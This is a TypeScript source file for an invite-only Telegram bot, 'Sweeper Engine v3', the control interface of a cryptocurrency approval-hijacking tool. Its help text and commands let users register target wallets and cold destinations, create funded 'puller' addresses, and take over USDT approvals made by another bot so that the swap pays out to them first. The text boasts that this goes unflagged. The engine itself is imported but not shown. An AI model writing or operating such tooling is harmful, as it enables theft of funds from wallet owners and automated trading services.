import { Telegraf } from 'telegraf';
import { authGuard } from './middleware';
import { mainKeyboardFor, adminKeyboard, backKeyboard } from './keyboards';
import { inviteLink } from './state';
import { upsertTarget, deactivate, listActive, newPuller, findTarget, adminStats } from '../engine/storage';
import { allowanceOf, gasof } from '../engine/puller';
import { engineState } from '../engine/listener';
import { ENV } from '../config/env';
import { db } from '../config/db';

const isAdmin = (id?: number) => id === ENV.ADMIN_ID;
const H = { parse_mode: 'HTML' as const };

const HELP = `<b>How this works</b>

<b>1. Arm</b>
<code>/arm &lt;agentic_wallet&gt; &lt;cold_destination&gt;</code>
You get a <b>puller</b> address. No pairing, no App step.

<b>2. Fund the puller</b>
Send ~0.003 BNB to it. It only pays gas.

<b>3. Done</b>
When the other bot approves USDT on your wallet, we take over that approval and the swap pays out to you in the same block, before their swap.

<b>Why it works</b>
We never hold an approval, so their bot never flags you, and we never need a wallet session.

<b>Commands</b>
<code>/arm</code> <code>/monitors</code> <code>/fund</code> <code>/unlink</code>`;

export function buildBot() {
    const bot = new Telegraf(ENV.TOKEN);

    bot.catch((e, ctx) => console.error(`[bot] ${ctx.updateType}:`, e));
    bot.use(authGuard);

    bot.start(async ctx => {
        await ctx.reply(
            `<b>Sweeper Engine v3</b>\n\nHijack mode active.`,
            { ...H, ...mainKeyboardFor(isAdmin(ctx.from?.id)) }
        );
    });

    bot.command('menu', ctx =>
        ctx.reply('<b>Sweeper Engine v3</b>', { ...H, ...mainKeyboardFor(isAdmin(ctx.from?.id)) })
    );

    bot.command('help', ctx => ctx.reply(HELP, { ...H, ...backKeyboard }));
    bot.action('HELP', async ctx => { await ctx.answerCbQuery(); await ctx.reply(HELP, { ...H, ...backKeyboard }); });

    bot.command('arm', async ctx => {
        const [, target, cold] = ctx.message.text.split(' ');
        if (!target || !cold) return ctx.reply('Usage: <code>/arm &lt;agentic_wallet&gt; &lt;cold&gt;</code>', H);
        const userId = ctx.from!.id;
        const { address: puller, key } = newPuller();

        await upsertTarget({ userId, target, destination: cold, puller, pullerKey: key });

        await ctx.reply(
            `<b>Armed</b>\nWallet: <code>${target}</code>\nPuller: <code>${puller}</code>\nCold: <code>${cold}</code>\n\n` +
            `Send ~0.003 BNB to the puller. Nothing else needed.`,
            { ...H, ...mainKeyboardFor(isAdmin(userId)) }
        );
    });

    bot.command('unlink', async ctx => {
        const target = ctx.message.text.split(' ')[1];
        if (!target) return ctx.reply('Usage: <code>/unlink &lt;wallet&gt;</code>', H);
        await deactivate(ctx.from!.id, target);
        await ctx.reply(`Removed <code>${target}</code>`, H);
    });

    bot.action('MONITORS', async ctx => {
        await ctx.answerCbQuery();
        const rows = await listActive(ctx.from!.id);
        if (!rows.length) return ctx.reply('No targets. /arm first.');
        const body = await Promise.all(rows.map(async r => {
            const gas = Number(await gasof(r.puller!)) / 1e18;
            return `<code>${r.target}</code> → <code>${r.destination}</code>\npuller <code>${r.puller}</code>\ngas ${gas.toFixed(4)} BNB`;
        }));
        await ctx.reply(`<b>Monitors</b>\n\n${body.join('\n\n')}`, { ...H, ...backKeyboard });
    });

    bot.action('FUND', async ctx => {
        await ctx.answerCbQuery();
        const rows = (await listActive(ctx.from!.id)).filter(r => r.puller);
        if (!rows.length) return ctx.reply('No pullers yet. /arm first.');
        const lines = await Promise.all(rows.map(async r =>
            `<code>${r.puller}</code> — ${(Number(await gasof(r.puller!)) / 1e18).toFixed(4)} BNB`
        ));
        await ctx.reply(`<b>Fund with ~0.003 BNB each:</b>\n\n${lines.join('\n')}`, { ...H, ...backKeyboard });
    });

    bot.action('ADDTOKEN', async ctx => { await ctx.answerCbQuery(); await ctx.reply('Handled automatically.', backKeyboard); });

    bot.command('admin', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.reply('Admin only.');
        await ctx.reply('<b>Admin Panel</b>', { ...H, ...adminKeyboard });
    });

    bot.action('A_PANEL', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        await ctx.reply('<b>Admin Panel</b>', { ...H, ...adminKeyboard });
    });

    bot.action('A_INVITE_GEN', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
        await db.query(`INSERT INTO invite_codes (code) VALUES ($1)`, [code]);
        await ctx.reply(`<b>Invite</b> (24h, single use)\n\n<code>${code}</code>\n${inviteLink(code)}`, {
            ...H, link_preview_options: { is_disabled: true }, ...adminKeyboard
        });
    });

    bot.action('A_STATS', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        const s = await adminStats();
        await ctx.reply(`<b>Stats</b>\nUsers: ${s.users}\nTargets: ${s.targets}\nOrphans: ${s.orphans}`, { ...H, ...adminKeyboard });
    });

    bot.action('A_USERS', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        const { rows } = await db.query(`SELECT user_id, username FROM authorized_users ORDER BY created_at DESC LIMIT 50`);
        await ctx.reply(rows.length ? rows.map(r => `<code>${r.user_id}</code> @${r.username ?? ''}`).join('\n') : 'none', { ...H, ...adminKeyboard });
    });

    bot.action('A_TARGETS', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        const rows = await listActive();
        if (!rows.length) return ctx.reply('No targets.');
        await ctx.reply(rows.map(r => `<code>${r.target}</code> u${r.userId}`).join('\n'), { ...H, ...adminKeyboard });
    });

    bot.action('A_ENGINE', async ctx => {
        if (!isAdmin(ctx.from!.id)) return ctx.answerCbQuery('Admin only');
        await ctx.answerCbQuery();
        await ctx.reply(`<b>Engine</b>\ntargets: ${engineState.targets}\nblock: ${engineState.lastBlock}\ndry: ${ENV.HIJACK_DRY}`, { ...H, ...adminKeyboard });
    });

    bot.action('MENU', async ctx => {
        await ctx.answerCbQuery();
        await ctx.editMessageText('<b>Sweeper Engine v3</b>', { ...H, ...mainKeyboardFor(isAdmin(ctx.from?.id)) });
    });

    return bot;
}
